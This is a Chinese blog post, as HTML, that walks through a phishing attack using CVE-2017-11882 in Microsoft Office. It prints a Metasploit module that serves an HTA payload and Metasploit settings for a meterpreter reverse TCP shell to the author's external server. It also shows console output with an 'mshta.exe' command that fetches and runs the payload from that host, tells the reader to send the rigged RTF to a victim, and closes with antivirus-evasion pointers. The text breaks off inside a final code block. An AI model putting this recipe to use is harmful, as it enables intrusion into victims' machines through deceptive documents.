<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>CVE-2017-11882钓鱼攻击 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>22</span>
<span class=rest>Nov 2017</span></div></div><div class=matter><h1 class=title>CVE-2017-11882钓鱼攻击</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-环境简介>0x01 环境简介</a></li><li><a href=#0x02-配置环境>0x02 配置环境</a></li><li><a href=#0x03-生成钓鱼rtf文档>0x03 生成钓鱼RTF文档</a></li><li><a href=#0x04-利用结果>0x04 利用结果</a></li><li><a href=#0x05-关于免杀---mshtaexe>0x05 关于免杀 - mshta.exe</a></li></ol></nav></aside><h2 id=0x00-前言>0x00 前言</h2><p>此次攻击使用了小组师傅改写的CVE利用脚本，能够将内容自定义，大大增加了小鱼上钩的可能。</p><h2 id=0x01-环境简介>0x01 环境简介</h2><ul><li>阿里云ECS服务器（Ubuntu） - <code>118.**.**.77</code></li><li>CVE-2017-11882.py 用于包装rtf</li><li>msf && CVE-2017-11882.rb</li></ul><p>CVE-2017-11882.rb内容如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This module requires Metasploit: https://metasploit.com/download</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Current source: https://github.com/rapid7/metasploit-framework</span>
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MetasploitModule</span>  <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Remote</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>Rank</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>NormalRanking</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>include</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Exploit</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Remote</span><span style=color:#f92672>::</span><span style=color:#66d9ef>HttpServer</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>initialize</span>(info  <span style=color:#f92672>=</span> {})
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>super</span>(update_info(info,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Name&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;Microsoft Office Payload Delivery&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Description&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>%q{
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        This module generates an command to place within
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        a word document, that when executed, will retrieve a HTA payload
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        via HTTP from an web server. Currently have not figured out how
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        to generate a doc.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      }</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;License&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>MSF_LICENSE</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Arch&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>ARCH_X86</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Platform&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;win&#39;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;Targets&#39;</span> <span style=color:#f92672>=&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>          <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;Automatic&#39;</span>, {} <span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;DefaultTarget&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    ))
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>on_request_uri</span>(cli, _request)
</span></span><span style=display:flex><span>    print_status(<span style=color:#e6db74>&#34;Delivering payload&#34;</span>)
</span></span><span style=display:flex><span>    p <span style=color:#f92672>=</span> regenerate_payload(cli)
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> <span style=color:#66d9ef>Msf</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Util</span><span style=color:#f92672>::</span><span style=color:#66d9ef>EXE</span><span style=color:#f92672>.</span>to_executable_fmt(
</span></span><span style=display:flex><span>      framework,
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>ARCH_X86</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;win&#39;</span>,
</span></span><span style=display:flex><span>      p<span style=color:#f92672>.</span>encoded,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#39;hta-psh&#39;</span>,
</span></span><span style=display:flex><span>      { <span style=color:#e6db74>:arch</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>ARCH_X86</span>, <span style=color:#e6db74>:platform</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;win &#39;</span>}
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>    send_response(cli, data, <span style=color:#e6db74>&#39;Content-Type&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;application/hta&#39;</span>)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>primer</span>
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> get_uri
</span></span><span style=display:flex><span>    print_status(<span style=color:#e6db74>&#34;Place the following DDE in an MS document:&#34;</span>)
</span></span><span style=display:flex><span>    print_line(<span style=color:#e6db74>&#34;mshta.exe </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>#{</span>url<span style=color:#e6db74>}</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=0x02-配置环境>0x02 配置环境</h2><p>首先我要将<code>阿里云安全组</code>配置一下，预留两个端口：</p><ul><li>7878 用于HTA WebServer</li><li>4455 用于接收客户端Shell</li></ul><p><img src=https://images.payloads.online/ed83ce4c-4f5e-11ec-b110-00d861bf4abb.png alt=0x04></p><p>接着，将<code>CVE-2017-11882.rb</code>放入metasploit-framework中的exploits目录里，然后打开msfconsole，<code>reload_all</code></p><p>这块不啰嗦</p><p>找一份简单的资料文本，新建一个RTF文件：</p><p><img src=https://images.payloads.online/edd304f8-4f5e-11ec-aa9e-00d861bf4abb.png alt=0x00></p><p>找好之后，在里面可以写上你想写的内容 :) 诱惑~ 哈哈</p><p>下一步就要设置msf模块的配置了：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>msf exploit(CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>11882</span>) <span style=color:#f92672>&gt;</span> show options 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options (exploit<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>11882</span>):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name     Current Setting  Required  Description
</span></span><span style=display:flex><span>   <span style=color:#f92672>----</span>     <span style=color:#f92672>---------------</span>  <span style=color:#f92672>--------</span>  <span style=color:#f92672>-----------</span>
</span></span><span style=display:flex><span>   SRVHOST  <span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>          yes       The local host to listen on<span style=color:#f92672>.</span> This must be an address on the local machine <span style=color:#f92672>or</span> <span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>
</span></span><span style=display:flex><span>   SRVPORT  <span style=color:#ae81ff>7788</span>             yes       The local port to listen on<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>   SSL      false            no        Negotiate SSL <span style=color:#66d9ef>for</span> incoming connections
</span></span><span style=display:flex><span>   SSLCert                   no        <span style=color:#a6e22e>Path</span> to a custom SSL certificate (default is randomly generated)
</span></span><span style=display:flex><span>   URIPATH  <span style=color:#ae81ff>1.</span>hta            no        The URI to use <span style=color:#66d9ef>for</span> this exploit (default is random)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options (windows<span style=color:#f92672>/</span>meterpreter<span style=color:#f92672>/</span>reverse_tcp):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
</span></span><span style=display:flex><span>   <span style=color:#f92672>----</span>      <span style=color:#f92672>---------------</span>  <span style=color:#f92672>--------</span>  <span style=color:#f92672>-----------</span>
</span></span><span style=display:flex><span>   EXITFUNC  process          yes       Exit technique (Accepted: <span style=color:#e6db74>&#39;&#39;</span>, seh, thread, process, none)
</span></span><span style=display:flex><span>   LHOST     <span style=color:#ae81ff>118.</span><span style=color:#f92672>**.**.</span><span style=color:#ae81ff>77</span>   yes       The listen address
</span></span><span style=display:flex><span>   LPORT     <span style=color:#ae81ff>4455</span>             yes       The listen port
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   <span style=color:#f92672>--</span>  <span style=color:#f92672>----</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   Automatic
</span></span></code></pre></td></tr></table></div></div><p>由于阿里云ECS服务器上没有对我的网卡直接分配外网IP，所以需要LHOST监听外网IP地址，SERVHOST用于目标机器访问加载HTA，填写0.0.0.0即可，这样现在就可以与安全组配置相符了。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msf exploit(CVE-2017-11882) &gt; exploit 
</span></span><span style=display:flex><span>[*] Exploit running as background job 13.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[-] Handler failed to bind to 118.**.**.77:4455:-  -
</span></span><span style=display:flex><span>[*] Started reverse TCP handler on 0.0.0.0:4455 
</span></span><span style=display:flex><span>[*] Using URL: http://0.0.0.0:7788/1.hta
</span></span><span style=display:flex><span>msf exploit(CVE-2017-11882) &gt; [*] Local IP: http://172.**.**.191:7788/1.hta
</span></span><span style=display:flex><span>[*] Server started.
</span></span><span style=display:flex><span>[*] Place the following DDE in an MS document:
</span></span><span style=display:flex><span>mshta.exe &#34;http://118.**.**.77:7788/1.hta&#34;
</span></span></code></pre></td></tr></table></div></div><p>执行<code>exploit</code>的时候它会提示无法bind外网IP，这属于正常现象，bind不上外网就会bind 0.0.0.0，所以没关系，我们的目的就是把外网IP地址写入HTA~</p><h2 id=0x03-生成钓鱼rtf文档>0x03 生成钓鱼RTF文档</h2><p><img src=https://images.payloads.online/ee15740a-4f5e-11ec-9b62-00d861bf4abb.png alt=0x01></p><p>此时将exp.rtf发送给对方即可。</p><h2 id=0x04-利用结果>0x04 利用结果</h2><p><img src=https://images.payloads.online/ee4d8b56-4f5e-11ec-a095-00d861bf4abb.png alt=0x02></p><p>受害者这边：</p><p><img src=https://images.payloads.online/eeaf4652-4f5e-11ec-ae0e-00d861bf4abb.png alt=0x03></p><h2 id=0x05-关于免杀---mshtaexe>0x05 关于免杀 - mshta.exe</h2><p>mshta被用的太多了，并且很容易被拦截</p><p>可以结合:http://payloads.online/archivers/2017-11-08/1 弄出新姿势</p><p>MSF官方给出了新的rb：</p><p><a href=https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb>https://raw.githubusercontent.com/realoriginal/metasploit-framework/39a4d193a17c6f85846a58a429c0914f542bded2/modules/exploits/windows/fileformat/office_ms17_11882.rb</a></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
